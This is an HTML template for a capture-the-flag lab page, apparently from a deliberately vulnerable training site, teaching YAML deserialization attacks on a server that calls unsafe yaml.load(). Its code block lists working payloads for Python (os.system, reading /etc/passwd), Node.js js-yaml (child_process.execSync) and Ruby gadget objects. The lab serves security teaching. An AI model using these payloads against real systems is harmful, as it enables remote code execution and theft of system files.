<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>🔮 YAML Deserialization</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>The server uses yaml.load() (unsafe) instead of yaml.safe_load(). Inject YAML tags to execute arbitrary code.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> YAML Parser</h2>
      <div class="vulnerable-form">
        <textarea id="yamlInput" rows="5">name: test
role: user</textarea>
        <button onclick="parseYaml()" class="btn">Parse YAML</button>
      </div>
      <div id="yamlResult" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">Python yaml.load() RCE:
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]

Node.js js-yaml:
!!js/function "function(){return require('child_process').execSync('id')}"

Ruby:
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('deserialization','flagInput_des3','flagResult_des3'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_des3" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_des3" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function parseYaml() {
      const res = await fetch('/labs/deserialization/yaml/parse', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({yaml:document.getElementById('yamlInput').value}) });
      document.getElementById('yamlResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
    }
  </script>
</body>
</html>
